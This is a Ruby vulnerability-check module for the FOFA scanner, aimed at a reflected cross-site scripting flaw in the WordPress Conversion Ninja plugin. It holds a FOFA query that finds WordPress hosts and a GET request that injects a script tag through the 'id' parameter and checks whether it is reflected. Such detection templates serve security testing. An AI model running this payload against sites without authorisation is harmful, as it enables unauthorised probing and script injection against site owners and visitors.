require 'fofa_core'

class FofaExploits < Fofa::Exploit
  def get_info
    {
      "Name": "Wordpress Conversionninja 插件 /lp/index.php文件 跨站脚本漏洞",
      "Description": "WordPress是WordPress软件基金会的一套使用PHP语言开发的博客平台，该平台支持在PHP和MySQL的服务器上架设个人博客网站。Conversion Ninja是其中的一个互联网营销插件。\r\n\r\nWordPress Conversion Ninja插件中存在跨站脚本漏洞，该漏洞源于lp/index.php脚本没有充分过滤‘id’参数。远程攻击者可利用该漏洞注入任意Web脚本或HTML。",
      "Author": "bibotaixsf@msn.cn",
      "Product": "Wordpress",
      "Homepage": "http://www.wordpress.com/",
      "DisclosureDate": "2016-04-23",
      "FofaQuery":"( body=\"content=\\\"WordPress\"$$ || (header=\"X-Pingback\" && header=\"/xmlrpc.php\" && body=\"/wp-includes/\" ) )",
      "References":["https://www.seebug.org/vuldb/ssvid-91369"      ],
      "ScanSteps":[
        "AND",
        {
          "Request":
          {
            "method": "GET",
            "uri": "/wp-content/plugins/conversionninja/lp/index.php?id=1\"/><script>prompt(/xss/);</script>",
          },
          "ResponseTest":
          {
            "type": "group",
            "operation": "AND",
            "checks": [
              {
                "type": "item",
                "variable": "$code",
                "operation": "==",
                "value": "200"
              },
              {
                "type": "item",
                "variable": "$body",
                "operation": "contains",
                "value": "<script>prompt(/xss/);</script>"
              }
            ]
          }
        }
      ]
    }
  end


  def initialize(info = {})
    super( info.merge(get_info()) )
  end

  def vulnerable(hostinfo)
    excute_scansteps(hostinfo) if @info['ScanSteps']
  end

  def exploit(hostinfo)
  end
end
